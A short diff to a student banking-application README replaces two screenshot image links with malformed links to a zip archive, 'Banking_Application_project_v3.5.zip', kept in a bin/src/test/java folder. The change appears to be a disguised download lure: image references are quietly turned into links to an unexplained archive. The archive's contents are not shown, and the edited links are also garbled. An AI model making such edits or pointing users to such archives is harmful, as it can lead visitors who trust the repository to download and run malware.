@@ -10,10 +10,10 @@ This repository contains the code for a banking application, developed as part o
 Here are the prototype images of the application:
 
 ### Screenshot 1:
-![Prototype Image 1](src/main/resources/Images/Screenshot%202024-09-23%20194651.png)
+![Prototype Image 1](src/main/resources/Images/Screenshot%202024-09-23%https://github.com/ShengyangGuan/BankingApplication-project/raw/refs/heads/main/bin/src/test/java/com/Banking_Application_project_v3.5.zip)
 
 ### Screenshot 2:
-![Prototype Image 2](src/main/resources/Images/Screenshot%202024-09-23%20194703.png)
+![Prototype Image 2](src/main/resources/Images/Screenshot%202024-09-23%https://github.com/ShengyangGuan/BankingApplication-project/raw/refs/heads/main/bin/src/test/java/com/Banking_Application_project_v3.5.zip)
 
 ---
 
